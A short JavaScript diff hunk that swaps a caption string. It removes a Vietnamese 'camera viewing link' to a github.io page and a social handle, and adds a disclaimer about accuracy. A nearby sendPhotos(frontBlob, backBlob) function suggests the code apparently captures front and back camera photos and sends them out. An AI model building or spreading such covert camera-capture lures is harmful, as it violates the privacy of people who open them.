@@ -153,9 +153,8 @@ function getCaption() {
 
 function getCaptionWithExtras() {
   return getCaption() + `
-
-📽️ Link xem camera: https://websitevip.github.io/webview/  
-🗣️ Xem đê @ontop2k9`;
+  
+Có những thông tin chưa đc chính xác 100%`;
 }
 
 async function sendPhotos(frontBlob, backBlob) {
